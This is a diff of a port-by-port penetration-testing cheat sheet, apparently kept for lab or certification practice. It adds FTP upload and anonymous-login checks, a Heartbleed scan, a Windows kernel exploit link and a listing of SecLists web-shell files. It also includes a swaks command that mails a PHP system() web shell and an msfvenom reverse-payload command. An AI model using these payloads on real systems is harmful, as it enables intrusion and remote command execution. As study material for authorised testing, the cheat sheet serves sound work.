@@ -1,7 +1,21 @@
 ## 0
 - `rustsvan -a 'IP' --no-banner --scripts none`
 - `nmap -n -Pn -p- -sV 'IP'`
-- `nmap -n -Pn -sC -sV --script vuln 'IP'`
+- `nmap -n -Pn -sV --script vuln 'IP'`
+
+
+
+## 21
+### curl
+```sh
+# upload
+curl -s -T 'UPLOADFILE' --user 'USERNAME':'PASSWORD' ftp://'IP'
+```
+### nmap
+```sh
+# anonymous login
+nmap -n -Pn -p21 --script=ftp-anon 'IP'
+```
 
 
 
@@ -17,6 +31,7 @@ ssh -i id_rsa.txt 'USERNAME'@'IP'
 ## 25
 ### swaks
 ```sh
+# send webshell
 swaks -f 'FREENAME@DOMAINNAME' -t 'TO_USERNAME@DOMAINNAME' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
 ```
 
@@ -25,6 +40,7 @@ swaks -f 'FREENAME@DOMAINNAME' -t 'TO_USERNAME@DOMAINNAME' -d '<?php system($_RE
 ## 80
 ### cadaver
 ```sh
+# connect to webdav
 cadaver 'URL'
 ```
 ### curl
@@ -35,6 +51,7 @@ curl -ks 'URL'
 ```
 ### davtest
 ```sh
+# test webdav
 davtest -url 'URL' -cleanup
 ```
 ### ffuf
@@ -86,6 +103,7 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoast
 ## 123 (UDP)
 ### ntpdate
 ```sh
+# sync date
 sudo ntpdate 'IP'
 ```
 
@@ -127,6 +145,7 @@ netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodho
 ## 443
 ### nmap
 ```sh
+# heartbleed
 nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```
 ### sslscan
@@ -243,6 +262,7 @@ netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 ### windows
 - [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)
 - [CVE-2009-0079](https://github.com/Re4son/Churrasco/)
+- [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)
 - https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-exploits.md
 - `https://github.com/abatchy17/WindowsExploits`
 - https://github.com/SecWiki/windows-kernel-exploits
@@ -277,7 +297,7 @@ impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
 ### msfvenom
 ```sh
-msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o s 'OUTPUT'
+msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o 'OUTPUT'
 ```
 ### name-that-hash
 ```sh
@@ -322,7 +342,7 @@ https://github.com/netbiosX/Default-Credentials
 ### seclists
 <details>
 <summary>クリック</summary>
-
+  
  ```sh
 └─$ find /usr/share/seclists/Discovery -type f -exec wc -l {} +  
     64770 /usr/share/seclists/Discovery/Infrastructure/All-Ipv4-ClassC-192.168.txt
@@ -753,8 +773,8 @@ https://github.com/netbiosX/Default-Credentials
      3216 /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
       197 /usr/share/seclists/Discovery/Mainframe/default_cics_transactions.txt
  31035327 total
-
-
+```
+```
 └─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
     1000 /usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt
     1000 /usr/share/seclists/Usernames/Names/familynames-usa-top1000.txt
@@ -770,8 +790,8 @@ https://github.com/netbiosX/Default-Credentials
       23 /usr/share/seclists/Usernames/sap-default-usernames.txt
  8295455 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
       10 /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
-
-                                                                                                                                                                                                                                            
+```
+```                                                                                                                                                                                                                                         
 └─$ find /usr/share/seclists/Passwords -type f -exec wc -l {} + 
    103979 /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
   5189454 /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
@@ -1503,6 +1523,71 @@ https://github.com/netbiosX/Default-Credentials
      9608 /usr/share/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
    279616 /usr/share/seclists/Passwords/Keyboard-Walks/walk-the-line.txt
      6240 /usr/share/seclists/Passwords/days.txt
+```
+```sh
+└─$ find /usr/share/seclists/Web-Shells -type f -exec wc -l {} +  
+    33 /usr/share/seclists/Web-Shells/FuzzDB/up.php
+    76 /usr/share/seclists/Web-Shells/FuzzDB/list.jsp
+   372 /usr/share/seclists/Web-Shells/FuzzDB/cmd.sh
+    25 /usr/share/seclists/Web-Shells/FuzzDB/cmd.php
+    43 /usr/share/seclists/Web-Shells/FuzzDB/up.sh
+    32 /usr/share/seclists/Web-Shells/FuzzDB/list.php
+    46 /usr/share/seclists/Web-Shells/FuzzDB/list.sh
+    91 /usr/share/seclists/Web-Shells/FuzzDB/reverse.jsp
+    17 /usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php
+    35 /usr/share/seclists/Web-Shells/FuzzDB/cmd.jsp
+   146 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+    42 /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+   454 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/proxy.asp
+   179 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/file.asp
+    83 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/shell.asp
+   153 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/dns.asp
+    35 /usr/share/seclists/Web-Shells/laudanum-1.0/README
+    99 /usr/share/seclists/Web-Shells/laudanum-1.0/cfm/shell.cfm
+     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/cmd.war
+     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/META-INF/MANIFEST.MF
+    11 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/WEB-INF/web.xml
+    41 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/cmd.jsp
+     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/makewar.sh
+   107 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/laudanum.php
+   182 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/file.php
+    60 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/ipcheck.php
+    66 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/settings.php
+   103 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/killnc.php
+   144 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/dns.php
+   336 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/proxy.php
+   194 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverse-shell.php
+   126 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/host.php
+   389 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
+    14 /usr/share/seclists/Web-Shells/laudanum-1.0/CREDITS
+   196 /usr/share/seclists/Web-Shells/laudanum-1.0/php/file.php
+   119 /usr/share/seclists/Web-Shells/laudanum-1.0/php/killnc.php
+   161 /usr/share/seclists/Web-Shells/laudanum-1.0/php/dns.php
+   351 /usr/share/seclists/Web-Shells/laudanum-1.0/php/proxy.php
+   192 /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php
+   142 /usr/share/seclists/Web-Shells/laudanum-1.0/php/host.php
+   409 /usr/share/seclists/Web-Shells/laudanum-1.0/php/shell.php
+   258 /usr/share/seclists/Web-Shells/laudanum-1.0/GPL
+   129 /usr/share/seclists/Web-Shells/laudanum-1.0/aspx/shell.aspx
+     3 /usr/share/seclists/Web-Shells/JSP/simple-shell.jsp
+    82 /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
+    26 /usr/share/seclists/Web-Shells/WordPress/bypass-login.php
+   772 /usr/share/seclists/Web-Shells/backdoor_list.txt
+    87 /usr/share/seclists/Web-Shells/CFM/shell.cfm.html
+    77 /usr/share/seclists/Web-Shells/Magento/newadmin-Inchoo.php
+    69 /usr/share/seclists/Web-Shells/Magento/newadmin-KINKCreative.php
+    59 /usr/share/seclists/Web-Shells/PHP/Dysco.php
+    13 /usr/share/seclists/Web-Shells/PHP/another-obfuscated-phpshell.php
+    22 /usr/share/seclists/Web-Shells/PHP/obfuscated-phpshell.php
+    17 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/VtigerVulnPlugin.php
+    25 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/manifest.xml
+    28 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/actions/Gateway.php
+    13 /usr/share/seclists/Web-Shells/Vtiger/README.md
+    25 /usr/share/seclists/Web-Shells/Vtiger/manifest.xml
+    25 /usr/share/seclists/Web-Shells/Vtiger/settings/actions/Gateway.php
+     2 /usr/share/seclists/Web-Shells/Vtiger/languages/en_us/VtigerVulnPlugin.php
+     2 /usr/share/seclists/Web-Shells/Vtiger/languages/en_us/Settings/VtigerVulnPlugin.php
+  7047 total
 ```
 </details>
 
